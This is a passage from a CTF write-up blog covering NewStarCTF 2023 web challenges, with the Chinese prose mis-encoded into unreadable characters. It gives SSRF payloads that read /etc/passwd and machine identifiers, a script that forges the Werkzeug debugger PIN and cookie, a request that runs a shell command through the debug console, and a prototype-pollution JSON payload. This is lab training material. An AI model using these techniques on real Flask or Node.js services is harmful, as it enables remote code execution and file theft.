class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);   </span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$x</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$x</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> <span class="title function_ invoke__">curl_setopt</span>(): The CURLOPT_HTTPHEADER option must have an <span class="keyword">array</span> value</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Áõ¥Êé•Êï∞ÁªÑËøáÔºåÁÑ∂ÂêéÊñá‰ª∂ËØªÂèñ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?hint[0]=your?&amp;hint[1]=mine!&amp;hint[2]=hint!!</span><br><span class="line"></span><br><span class="line">?url=file:///app.py&amp;lolita[]=</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># from NeepuF1Le import neepu_files</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;******&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;islogin&quot;</span>) == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;***********************&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1314</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÂºÄÂêØ debugÊ®°ÂºèÔºåÂπ∂‰∏îÂèØ‰ª•ËØªÂèñÊñá‰ª∂ÔºåÊâìpinÂÄº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///etc/passwd&amp;lolita[]=</span><br><span class="line">ÂæóÂà∞root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flask.app</span><br><span class="line">Flask</span><br><span class="line"></span><br><span class="line">?url=file:///sys/class/net/eth0/address&amp;lolita[]=</span><br><span class="line">f6:f5:77:8b:67:8d 1</span><br><span class="line"></span><br><span class="line">?url=file:///etc/machine-id&amp;lolita[]=</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=file:///proc/sys/kernel/random/boot_id&amp;lolita[]=</span><br><span class="line">a7cf87a4-f7b3-4edd-93e3-854e78d97842 1</span><br><span class="line"></span><br><span class="line">?url=file:///proc/self/cgroup&amp;lolita[]=</span><br><span class="line">-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NeepuF1Le ÊòØ‰ªÄ‰πàpythonÁâàÊú¨ÊâçÂá∫Áé∞ÁöÑ -&gt; neupy python 3.10</span><br><span class="line">/usr/local/lib/python3.10/dist-packages/flask/app.py</span><br></pre></td></tr></table></figure>

<p>ÊúÄÂêéÊï¥ÁêÜ‰∏Ä‰∏ã</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">flask.app</span><br><span class="line">Flask</span><br><span class="line">/usr/local/lib/python3.10/dist-packages/flask/app.py</span><br><span class="line">271534133045133</span><br><span class="line">a7cf87a4-f7b3-4edd-93e3-854e78d97842-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope</span><br></pre></td></tr></table></figure>

<p>‰ΩÜÊòØËøôÊòØ<code>python3.10</code>Â•ΩÂÉè‰∏çËÉΩÁî®‰∫é‰πãÂâçÁöÑËÑöÊú¨Ôºå‰πãÂâçÈÉΩÊòØ3.8ÊúÄÈ´ò</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  </span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;271534133045133&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;a7cf87a4-f7b3-4edd-93e3-854e78d97842-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cookie_name + <span class="string">&quot;=&quot;</span> + <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÂæóÂà∞<code>107-667-381</code>Âíå<code>__wzd03fbc8a0ce3cfdab3d2e=1754745570|65ee6ca6bbab</code></p>
<p>ËÆøÈóÆconsoleÊù•Ëé∑Âæó<code>secret</code>Âíå<code>frm</code>ÔºåÊ≤°ÊúâÊä•Èîô<code>frm</code>ÈªòËÆ§‰∏∫0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http://localhost:1314/console&amp;lolita[]=</span><br><span class="line">JbjRr8rMsX31cclteJRo</span><br></pre></td></tr></table></figure>

<p>ÂÜçÊù•ssrfËøôÈáå</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?lolita[]=Cookie:__wzd03fbc8a0ce3cfdab3d2e=1754745570|65ee6ca6bbab&amp;url=http://127.0.0.1:1314/console?__debugger__=yes&amp;pin=107-667-381&amp;cmd=__import__(&quot;os&quot;).popen(&quot;cat%2B/flag&quot;).read()&amp;frm=0&amp;s=JbjRr8rMsX31cclteJRo</span><br></pre></td></tr></table></figure>

<h2 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>176</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;reason&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">      <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yy19-MM-ddTHH:mm:ss.fffZ&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">      <span class="attr">&quot;baseDate&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">      <span class="attr">&quot;fff&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bbb&quot;</span></span></span><br><span class="line"><span class="language-json">    <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json">  <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="ËÅäËÅä"><a href="#ËÅäËÅä" class="headerlink" title="ËÅäËÅä"></a>ËÅäËÅä</h2><p>‰Ω†Â±ÖÁÑ∂ÁúãÂà∞‰∫ÜËøôÈáåÔºüÁ™ÅÁÑ∂ÊÉ≥Ëµ∑Êù•ÂéªÂπ¥Êàë‰ª•‰∏∫Â§™ËèúËÄåÊôö‰∏äÂ§±Áú†ÔºàÂçÅ‰∫åÁÇπÂ§öÊâçÁù°ÁùÄÔºåËôΩÁÑ∂Áé∞Âú®Â∑≤ÁªèÊòØÂÆ∂Â∏∏ÔºâÔºåÂ§™Ëèú‰∏ªË¶ÅÊòØ‰∏§‰∏™ÁÇπÔºåÁ¨¨‰∏Ä‰∏™ÊòØnepCTFÔºåÊàëÂ∑≤ÁªèÂ≠¶‰∫ÜÂø´ÂçäÂπ¥‰∫ÜÂΩìÊó∂ÔºåËøòÊòØÂÅö‰∏çÂá∫Êù•‰ªÄ‰πàÈ¢òÔºåÁîöËá≥ËØ¥Ëá™Â∑±Áúã‰ª£Á†ÅÈÉΩÈöæÂæóÂæàÔºåËøòÊúâ‰∏Ä‰∏™Â∞±ÊòØÂá∫È¢òÔºånewstarËøôÁ±ªÁöÑÊñ∞ÁîüËµõÔºåÊàëÊòØ‰∏Ä‰∏™ÈÇÄËØ∑ÈÉΩÊ≤°Êúâ„ÄÇÊ≤°‰∫∫Áü•ÈÅìÊàëÔºåÊõ¥Ê≤°‰∫∫‰ºöËÆ∞ÂæóÊàë„ÄÇ</p>
<p>‰∫éÊòØÊàëÂ∞±ÂºÄÂßãÈ™öÊâ∞ÊàëÁöÑÂ∏àÁà∂Ôºå‰ªñÂ∑•‰ΩúÂº∫Â∫¶ËøòÊòØÊå∫È´òÁöÑÔºåÊàë‰∏Ä‰∏™‰∫∫Âèë‰∫Ü‰∫åÂçÅÂ§öÊù°‰ø°ÊÅØÔºåÂèΩÈáåÂë±Âï¶ÁöÑÔºå‰ΩÜÊòØ‰ªñ‰∏ÄÊù°‰πüÊ≤°ÂõûÔºàÂøÉÊÉ≥ÊúÄÂêéÁöÑ‰æùÈù†ÈÉΩÊ≤°‰∫ÜÔºâÔºåËøá‰∫Ü‰∏ÄÂàÜÈíüÔºå‚ÄúÊòéÂπ¥‰Ω†Â¶ÇÊûúÊÉ≥Âá∫È¢òÁöÑËØùÔºåÊàëÂèØ‰ª•Â∏Æ‰Ω†ÊêûÂÆöËøô‰ª∂‰∫ã‚Äù„ÄÇËøôÊ¨°È™öÊâ∞ÁöÑÂéüÂõ†ÔºåÂÖ∂ÂÆûËøòÊòØËá™Â∞äÂøÉ‰ΩúÁ•üÔºåÂõ†‰∏∫ÂΩìÊó∂ÁöÑÂá∫È¢ò‰∫∫webÈáåÈù¢Áúü‰∏çÊòØÁâπÂà´ÂéâÂÆ≥ÔºåÊàëËßâÂæóÊàëÂ∫îËØ•ÊòØÊØî‰ªñ‰ª¨Ë¶ÅÁï•ÂæÆÂº∫‰∏Ä‰∏¢‰∏¢ÁöÑÔºå‰ΩÜÊòØÊàëÂç¥Ê≤°ÊúâËøôÊ†∑ÁöÑÊú∫‰ºöwww„ÄÇ</p>
<p>ÂøΩËÄåÈÉΩÂ∑≤ÁªèËøáÂéª‰∏ÄÂπ¥‰∫ÜÔºå‰πãÂâçÂ∑ÆÁÇπÁàÜÈõ∂ÁöÑnepCTF‰πüÊòØËÉΩÂÅöÊúÄÂêé‰∏ÄÈ¢ò‰∫ÜÔºåËÄå‰∏îÂøÉÊÄÅÂèòÂåñÔºåÁé∞Âú®‰Ω†ÂèØËÉΩËÆ©ÊàëÂéªÂá∫ËøôÁßçÊñ∞ÁîüËµõÁöÑÈ¢òÊàëÈÉΩ‰∏çÂ§ßÊÑøÊÑè‰∫ÜÔºàbaseÂèØ‰ª•ÔºâÔºåÂπ¥ÂàùÂíåÂéªÂπ¥Êú´ÂæàÂ§öÊñ∞ÁîüËµõÔºåmmpÔºåÈÉΩÊòØÊâìÁùÄÊñ∞ÁîüËµõÁöÑÊóóÂè∑ÔºåÂ±ïÁ§∫Ëá™Â∑±ÁöÑÔºåÊúâ‰∫õ‰∏úË•ø‰Ω†ËÉΩÈÅáÂà∞ÊàëÂêÉÔºåÂ∞±ÊãøÊüêGAMEÂíåÊò®Âπ¥‰∫î‰∏™Â≠¶Ê†°ËÅîÂêàÔºàÈªëÈæôÊ±üÁêÜÂ∑•Âú®ÂÜÖÔºåÂêçÂ≠óÂøò‰∫ÜÔºâÔºå‰∏ªË¶ÅÂêêÊßΩ‰∏§‰∏™È¢òÔºå‰∏Ä‰∏™ÊØîËµõ‰∏Ä‰∏™Ôºà‰∏çÂÅèÁà±ÂìàÔºâÔºå‰∏Ä‰∏™ÊòØÊüêNDAYÁöÑÂ§çÁé∞ÔºåÂà©Áî®Êù°‰ª∂ÊûÅÂÖ∂ËãõÂàªÔºåÂè¶‰∏Ä‰∏™ÊòØhttpÔºåÈáåÈù¢ÁöÑhttpÂ§¥Êàë‰∏Ä‰∏™ÈÉΩ‰∏çÁü•ÈÅìÔºåÁúüÂ∞±‰∏ÄÁÇπÈÉΩÊ≤°ËßÅËøá„ÄÇ</p>
<p>Ëøô‰∏§Â§©Ëä±Êó∂Èó¥ÂÅö‰∫ÜÂÅö23Âπ¥ÁöÑnewstarÔºåÂèëÁé∞ÊàëÁ´üÁÑ∂ËøòÊòØËÉΩ‰ªéÊñ∞ÁîüËµõÈáåÈù¢Â≠¶Âà∞‰∏úË•øÔºå‰ª§ÊàëÂΩ¢Ë±°Ê∑±ÂàªÊõ¥ÊòØ„ÄÇ‰ΩÜÊòØÂπ¥ÂàùÂíåÂéªÂπ¥Êú´ËøôÊÆµÊó∂Èó¥ÁöÑÊñ∞ÁîüËµõÔºåÊàëÂü∫Êú¨Â∞±Ê≤°Â≠¶Âà∞‰ªÄ‰πà‰∏úË•ø‰∫ÜÔºåÊõ¥‰ΩïÂÜµÊòØÂéªÂπ¥ÁöÑÊàëÔºåÁîöËá≥‰Ω†ÈóÆÊàëÂÅöËøáÁöÑÈ¢òÔºåÊàëÂèØËÉΩ‰∏ÄÁÇπÂΩ¢Ë±°ÈÉΩÊ≤°Êúâ„ÄÇ</p>
<p>ËØ¥Âà∞ÊúÄÂêéÂÖ∂ÂÆûÂ∞±ÊòØÊÉ≥ËÆ©ÁúãÂà∞ËøôÈáåÁöÑÂ∏àÂÇÖÔºåÂá∫È¢òÁöÑÂ∏àÂÇÖÂ∞ΩÈáè‰∏çË¶ÅÂ•óÔºåÊõ¥‰∏çË¶ÅËÑëÊ¥ûÔºåÂ∞±ÂàÜ‰∫´Ëá™Â∑±ÊúÄËøëÁ†îÁ©∂ÁöÑÂßøÂäøÂ∞±ÂèØ‰ª•‰∫ÜÔºåÁâπÂà´ÊòØÂà´Èöè‰æøÁî©‰∏™ÂÜ∑Èó®NDAYÔºàËøô‰∏çÂÇª*ÂêóÔºâ„ÄÇÊúÄËøë‰ºöÊúâ‰∏Ä‰∏™LILCTFÔºåÈáåÈù¢ÁöÑÂ∏àÂÇÖÊ∞¥Âπ≥ÈÉΩÂíåÊàëÂ∑Æ‰∏çÂ§ö„ÄÅÊõ¥Â•ΩÔºåÊó¢ÁÑ∂ÊòØÊâì‰∫Ü‚ÄúÂàùÂøÉ‚ÄùÁöÑÊóóÂè∑ÁöÑÔºåÊàëËßâÂæóÂèØ‰ª•ÂÜ≤ÔºàÊàëË¶ÅÂíåsuerÂèÇÂä†ÂõΩÈôÖËµõÂ∞±‰∏çÊù•‰∫ÜÔºâÔºåÈ¢ÑÁ•ùLILCTFÈ°∫Âà©‰∏æÂäû„ÄÇ</p>
<p>ËøòÊúâ‰∏Ä‰∏™CTFÂ∞±ÊòØSU JuniorÔºåÊàëÁúã‰∫ÜÊñáÊ°£ÁöÑÔºåÁÆÄÁõ¥Â∞±ÊòØÂàÜÁ´ôËµõÁ∫ßÂà´ÁöÑÁ≤æÂçéÈ¢òÁõÆÔºåÂèØÂà´ÈîôËøáÂó∑ÔºåÊöÇÊó∂ËøòÊúâÂÆöÊ°£ÔºåËÇØÂÆöÊòØÂú®‰πù„ÄÅÂçÅÊúàÔºÅ</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.png" alt="baozongwi reward">
        <span>reward</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>baozongwi
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://baozongwi.xyz/posts/12220.html" title="NewStarCTF 2023 ÂÖ¨ÂºÄËµõÈÅì">https://baozongwi.xyz/posts/12220.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/php/" rel="tag"># php</a>
              <a href="/tags/ssti/" rel="tag"># ssti</a>
              <a href="/tags/mysql/" rel="tag"># mysql</a>
              <a href="/tags/phar/" rel="tag"># phar</a>
              <a href="/tags/nodejs/" rel="tag"># nodejs</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/32931.html" rel="prev" title="Dest0g3 520ËøéÊñ∞Ëµõ">
                  <i class="fa fa-angle-left"></i> Dest0g3 520ËøéÊñ∞Ëµõ
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/4207.html" rel="next" title="Êò•Áßã‰∫ëÈïúInitial">
                  Êò•Áßã‰∫ëÈïúInitial <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 ‚Äì 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baozongwi</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">3.1m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">87:21</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
